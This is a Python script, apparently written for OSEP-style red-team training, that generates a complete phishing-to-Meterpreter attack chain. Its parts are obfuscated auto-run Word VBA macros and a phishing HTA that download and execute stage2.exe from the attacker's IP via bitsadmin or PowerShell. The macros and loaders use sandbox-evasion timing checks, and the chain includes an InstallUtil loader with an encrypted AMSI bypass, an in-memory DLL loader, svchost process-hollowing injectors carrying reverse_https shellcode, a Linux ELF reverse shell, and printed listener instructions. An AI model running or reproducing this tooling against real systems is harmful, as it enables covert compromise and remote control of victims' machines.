#! /usr/bin/python3

import sys
import base64
import subprocess
import os


if len(sys.argv) < 2:
    exit("IP as second argument")

ip=sys.argv[1]

def rot(variable_name, text):
    sum = ""
    for a in text:
        sum = f"{sum}:{ord(a)+12}"

    result = sum[1:]
    if len(result) < 150:
        return f'    {variable_name} = "{result}"'
    n = 150
    arr = [result[i:i+n] for i in range(0, len(result), n)]
    result = ""
    result += f"    {variable_name} = \"{arr[0]}\"\n"
    for r in arr[1:]:
        result += f"    {variable_name} = {variable_name} & \"{r}\"\n"
    return result

if len(sys.argv) < 2:
    exit("IP as second argument")

a=rot('a', 'cmd.exe /C \"bitsadmin /transfer myjob /download /priority high http://'+ip+'/stage2.exe c:\\windows\\tasks\\stage2.exe && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\stage2.exe\"')
b=rot('b', 'winmgmts:')
c=rot('c', 'Win32_Process')
d=rot('d', f"powershell wget -Uri http://{ip}/stage2.exe -OutFile c:\\windows\\tasks\\stage2.exe ; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\stage2.exe")

payload=f'''Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Sub Document_Open()
    Calculator
End Sub

Sub AutoOpen()
    Calculator
End Sub

Sub Calculator()
    Dim sadfasfsadfasdf As Date
    Dim asdfasdfassfdasfdsdfsdf As Date
    Dim a As String, b As String, c As String, cd As String
    Dim timeeee As Long
    sadfasfsadfasdf = Now()
    Dim arr
    Sleep(3000)
    asdfasdfassfdasfdsdfsdf = Now()
    timeeee = DateDiff("s", sadfasfsadfasdf, asdfasdfassfdasfdsdfsdf)

{a}
{b}
{c}
{d}
    

    If timeeee < 2.5 Then
        Exit Sub
    End If

    Dim aaa As Object, bbb As Object
    
    arr = Split(b, ":")
    sum = ""
    For Each s In arr
        sum = sum + Chr(s - 12)
    Next s
    sum2 = sum
    Set aaa = GetObject(sum2)

    arr = Split(c, ":")
    sum = ""
    For Each s In arr
        sum = sum + Chr(s - 12)
    Next s
    sum3 = sum
    
    
    Set bbb = aaa.Get(sum3)
        
    arr = Split(a, ":")
    sum = ""
    For Each s In arr
        sum = sum + Chr(s - 12)
    Next s
    sum1 = sum

    arr = Split(d, ":")
    sum = ""
    For Each s In arr
        sum = sum + Chr(s - 12)
    Next s
    sum4 = sum

    On Error GoTo Oops
    bbb.Create sum1, sdfasdfasdfasdfasdf, asdfsafdsafdasfdfsdasdfsdf, asdfsfdasfdsadfsadffasdfasdfasdf
Oops:
    Shell sum4, vbHide
End Sub'''

file1 = open('/tmp/stage1.vba', 'w')
file1.write(payload)
file1.close()

process = subprocess.Popen(f"msfvenom -p windows/meterpreter/reverse_https LHOST={ip} LPORT=8444 EXITFUNC=thread PrependMigrate=true -f vbapplication".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
meterpreter_payload, stderr = process.communicate()

print(f"""
++++++++++++++++++++++++++++++++++++++++
      FOR CUSTOM VBA shellcode
++++++++++++++++++++++++++++++++++++++++

use multi/handler       
set payload windows/meterpreter/reverse_https
set LHOST {ip}
set LPORT 8444
set EXITFUNC thread
set PrependMigrate true
run -j
      
++++++++++++++++++++++++++++++++++++++++
""")

payload=f'''Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    
    If time < 2 Then
        Exit Sub
    End If
        
    
    {meterpreter_payload}


    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
'''

file2 = open('/tmp/stage2.vba', 'w')
file2.write(payload)
file2.close()


payload='''using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace pwbypass
{
    class Program 
    {
        static void Main(string[] args){}
    }
    

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        string EncryptOrDecrypt(string text, string key)
        {
            var result = new StringBuilder();

            for (int c = 0; c < text.Length; c++)
                result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));

            return result.ToString();
        }

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // check for sandboxes
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5){return;}
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null){return;}

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            
            String a = Encoding.UTF8.GetString(Convert.FromBase64String("|||amsi_bypass|||"));
            String b = Encoding.UTF8.GetString(Convert.FromBase64String("|||cmd1|||"));
            String c = "thisismyverykulenckeee";

            ps.AddScript(EncryptOrDecrypt(a, c));
            ps.Invoke();

            ps.AddScript(EncryptOrDecrypt(b, c));
            ps.Invoke();

            rs.Close();
        }
    }
}'''

amsi_bypass = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)"
cmd1 = "$data = (New-Object System.Net.WebClient).DownloadData('http://"+ip+"/stage3.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType(\"ClassLibrary1.Class1\");$method = $class.GetMethod(\"runner\");$method.Invoke(0, $null);"

# amsi_bypass = base64.b64encode(bytes(amsi_bypass, 'utf-8')).decode()
# cmd1 = base64.b64encode(bytes(cmd1, 'utf-8')).decode()

key = "thisismyverykulenckeee"

# encrypt payloads
text = amsi_bypass
encrypted_text = ""

for i in range(len(text)):
    encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))

amsi_bypass = base64.b64encode(encrypted_text.encode()).decode()

# encrypt payloads
text = cmd1
encrypted_text = ""

for i in range(len(text)):
    encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))

cmd1 = base64.b64encode(encrypted_text.encode()).decode()

payload = payload.replace("|||amsi_bypass|||",amsi_bypass)
payload = payload.replace("|||cmd1|||",cmd1)


file1 = open('/tmp/stage2.cs', 'w')
file1.write(payload)
file1.close()

cmd = "mcs /reference:/home/kali/OSEP/csharp/System.Management.Automation.dll /reference:System.Configuration.Install.dll /tmp/stage2.cs -out:/var/www/html/stage2.exe"
process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
process.wait()

cmd = "cp /var/www/html/stage2.exe /home/kali/OSEP/csharp/stage2.exe"
process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
process.wait()

payload='''using System;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        public static void runner()
        {
            // stworznie struktur dla informacji o procesie
            STARTUPINFO si = new STARTUPINFO(); // wejsciowe
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION(); //wyjsciowe

            // 0x4 - SUSPENDED
            CreateProcess(null, "C:\\\\Windows\\\\System32\\\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            // przygotowanie struktury na dane z ZwQuery
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            // 6 razy intptr size poniewaz taka wielkosc ma PROCESS_BASIC_INFORMATION
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            // ImageBase jest + 0x10 od poczatku PEB
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            // odczytanie pamieci z miejsca w imagebase
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            // sparsowanie odczytanego miejsca w pamieci jako poczatek naglowka
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // odczytanie 200 bajtow naglowka
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            // odczytanie z naglowka miejsca w pamieci gdzie zaczyna sie kod (tak na prawde jego offsetu)
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            |||meterpreter_payload|||

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}
'''

process = subprocess.Popen(f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT=8443 EXITFUNC=thread -f csharp".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
meterpreter_payload, stderr = process.communicate()

payload = payload.replace("|||meterpreter_payload|||",meterpreter_payload)

# Save code for stager 3 DLL
file1 = open('/tmp/stage3.cs', 'w')
file1.write(payload)
file1.close()

# Create stage3.txt 
file2 = open('/var/www/html/stage2.txt', 'w')
file2.write(f"""bitsadmin /transfer myjob /download /priority high http://{ip}/stage2.exe c:\\windows\\tasks\\stage2.exe
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\stage2.exe
""")
file2.close()

# Compile stager 3 DLL
process = subprocess.Popen("mcs /tmp/stage3.cs -target:library -out:/var/www/html/stage3.dll".split(), stdout=subprocess.PIPE)
process.wait()


exe_hollow = '''using System;
using System.Text;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        static string EncryptOrDecrypt(string text, string key)
        {
            var result = new StringBuilder();

            for (int c = 0; c < text.Length; c++)
                result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));

            return result.ToString();
        }

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(4000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 3.5) { return; }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null) { return; }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\\\Windows\\\\System32\\\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);


            String a = Encoding.UTF8.GetString(Convert.FromBase64String("|||meterpreter_payload_encoded|||"));
            String b = "thisismyverykulenckeee";
            byte[] buf = Convert.FromBase64String(EncryptOrDecrypt(a, b));

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}
'''

process = subprocess.Popen(f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ip} LPORT=8443 EXITFUNC=thread -f base64".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
meterpreter_payload, stderr = process.communicate()

# encrypt payloads
text = meterpreter_payload
encrypted_text = ""

for i in range(len(text)):
    encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))

meterpreter_payload_encoded = base64.b64encode(encrypted_text.encode()).decode()

exe_hollow = exe_hollow.replace("|||meterpreter_payload_encoded|||",meterpreter_payload_encoded)

# Save code for stager 3 DLL
file3 = open('/tmp/exe_hollow3.cs', 'w')
file3.write(exe_hollow)
file3.close()

# Compile exe hollower
process = subprocess.Popen("mcs /tmp/exe_hollow3.cs -out:/var/www/html/hollow.exe".split(), stdout=subprocess.PIPE)
process.wait()


print(f"""
++++++++++++++++++++++++++++++++++++++++
      FOR STAGED ATTACK:
++++++++++++++++++++++++++++++++++++++++

use multi/handler       
set payload windows/x64/meterpreter/reverse_https
set LHOST {ip}
set LPORT 8443
set EXITFUNC thread
run -j
      
++++++++++++++++++++++++++++++++++++++++
""")

print(f"""
++++++++++++++++++++++++++++++++++++++++

Now you can paste VB code to the phishing word that will open in mousepad
      
If not the is:
- \\\\{ip}\\csharp\\stage2.exe      
- /var/www/html/stage2.exe
- /var/www/html/stage3.dll

To run the attack you need to run stage2.exe
It can be done like so:

powershell -exec bypass -nop -c "bitsadmin /transfer myjob /download /priority high http://{ip}/stage2.exe c:\\windows\\tasks\\stage2.exe ; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\stage2.exe"    
      
++++++++++++++++++++++++++++++++++++++++
""")

process = subprocess.Popen(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT=8443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o /var/www/html/meter.elf".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
meterpreter_payload, stderr = process.communicate()

print(f"""
++++++++++++++++++++++++++++++++++++++++
      FOR LINUX ELF FILE:
++++++++++++++++++++++++++++++++++++++++

use multi/handler       
set payload linux/x64/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT 8443
set prependfork true
run -j
      
++++++++++++++++++++++++++++++++++++++++
wget http://{ip}/meter.elf
++++++++++++++++++++++++++++++++++++++++
""")

phishing_hta = f'''
<html>
  <head></head>
  <body></body>
  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "cmd /K bitsadmin /transfer myjob /download /priority high http://{ip}/stage2.exe c:\\windows\\tasks\\stage2.exe & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\stage2.exe"
    End Function

    Pwn
  </script>
</html>
'''

file4 = open('/var/www/html/phishing.hta', 'w')
file4.write(phishing_hta)
file4.close()

# Show VBA for phishing document
process = subprocess.Popen("mousepad /tmp/stage1.vba".split(), stdout=subprocess.PIPE)
process = subprocess.Popen("mousepad /tmp/stage2.vba".split(), stdout=subprocess.PIPE)
